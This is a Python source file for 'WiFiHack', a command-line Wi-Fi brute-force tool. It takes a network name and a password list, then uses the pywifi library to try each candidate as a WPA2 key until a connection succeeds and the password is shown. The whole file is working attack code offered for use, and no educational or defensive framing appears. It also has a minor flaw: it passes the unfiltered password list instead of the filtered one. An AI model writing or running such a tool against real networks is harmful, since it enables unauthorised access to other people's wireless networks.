import platform, pywifi, sys, time, threading, os
from rich.console import Console
from pywifi import const
from rich import print as printf
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor

SUCCESS, FAILED, LOOPING = (0, 0, 0)
LOCK = threading.Lock()

def Terminal() -> None:
    if 'microsoft' in platform.uname().release.lower():
        printf(Panel(f"[bold red]Sorry, WiFiHack is not compatible with wsl, please use windows powershell to run this program!", width=55, style="bold bright_black", title="[bold bright_black]>> [Error] <<"))
        sys.exit(0)

def Banner() -> None:
    systems = platform.system()
    os.system('cls' if systems == "Windows" else 'clear')
    printf(Panel(
            r"""[bold red] __        ___ _____ _   _   _            _    
 \ \      / (_)  ___(_) | | | | __ _  ___| | __
  \ \ /\ / /| | |_  | | | |_| |/ _` |/ __| |/ /
   \ V  V / | |  _| | | |  _  | (_| | (__|   < 
[bold white]    \_/\_/  |_|_|   |_| |_| |_|\__,_|\___|_|\_\
              [bold white on red]PyWiFi Brute Force v1.0""", width=55, style="bold bright_black"))
    return Terminal()

def WiFi_Connect(ssid: str, password: str) -> str:
    global FAILED, SUCCESS
    with LOCK:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.disconnect()
        time.sleep(1)

        if iface.status() == const.IFACE_DISCONNECTED:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.key = password
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)

            iface.connect(tmp_profile)
            time.sleep(5)

            if iface.status() == const.IFACE_CONNECTED:
                iface.disconnect()
                time.sleep(1)
                SUCCESS += 1
                return password
            else:
                iface.disconnect()
                time.sleep(1)
                FAILED += 1
                return "null"

def Brute_Force(ssid: str, password_list: list) -> bool:
    global LOOPING
    printf(Panel(f"[bold white]You can use[bold red] CTRL + Z[bold white] to stop and whether it works or not depends on the password list you use!", width=55, style="bold bright_black", title="[bold bright_black]>> [Warning] <<"))
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(WiFi_Connect, ssid, pwd) for pwd in password_list]
        for future in futures:
            password = future.result()
            LOOPING += 1
            printf(f"[bold bright_black]   ──>[bold white] Hack[bold blue] @{ssid.replace(' ','').lower()}[bold white]/[bold blue]{len(password_list)}[bold white]/[bold blue]{LOOPING}[bold white] Bad:-[bold red]{FAILED}[bold white] Ok:-[bold green]{SUCCESS}[bold white]!     ", end="\r")
            if password != 'null':
                executor.shutdown(wait=False)
                printf(Panel(f"""[bold white]Status :[bold green] Password successfully found!
[bold white]Passwords :[bold red] {password}""", width=55, style="bold bright_black", title="[bold bright_black]>> [Success] <<"))
                return True
    printf(Panel(f"[bold red]Sorry, We couldn't find a suitable password for that wifi, please try with another password list!", width=55, style="bold bright_black", title="[bold bright_black]>> [Failed] <<"))
    return False

if __name__ == "__main__":
    try:
        Banner()

        start_time = time.time()

        printf(Panel(f"[bold white]You must fill in the WiFi name, for example:[bold green] WiFi Kita[bold white] *[bold red]make sure the name matches[bold white]!", width=55, style="bold bright_black", title="[bold bright_black]>> [WiFi Name] <<", subtitle="[bold bright_black]╭─────", subtitle_align="left"))
        SSID = Console().input("[bold bright_black]   ╰─> ")
        printf(Panel(f"[bold white]You must fill in the password list, for example:[bold green] Penyimpanan/Password.txt\n[bold white]*[bold red]make sure the file is in the same folder[bold white]!", width=55, style="bold bright_black", title="[bold bright_black]>> [Password List] <<", subtitle="[bold bright_black]╭─────", subtitle_align="left"))
        FILE = Console().input("[bold bright_black]   ╰─> ")
        LIST_PASSWORD = []
        try:
            with open(FILE, "r+") as f:
                PASSWORD = f.read().splitlines()
                for i in PASSWORD:
                    if len(i) < 5:
                        continue
                    else:
                        LIST_PASSWORD.append(i)
            if len(LIST_PASSWORD) == 0:
                printf(Panel(f"[bold red]Sorry, The file you entered is empty, please try again!", width=55, style="bold bright_black", title="[bold bright_black]>> [Error] <<"))
                sys.exit(0)
        except FileNotFoundError:
            printf(Panel(f"[bold red]Sorry, The file you entered doesn't exist, please try again!", width=55, style="bold bright_black", title="[bold bright_black]>> [Error] <<"))
            sys.exit(0)

        Brute_Force(SSID, PASSWORD)

        end_time = time.time()
        elapsed_time = end_time - start_time
        printf(f"[bold white]Program finished in[bold green] {elapsed_time:.2f} [bold white]seconds!")
        sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        printf(Panel(f"[bold red]{str(e).capitalize()}!", width=55, style="bold bright_black", title="[bold bright_black]>> [Error] <<"))
        sys.exit(0)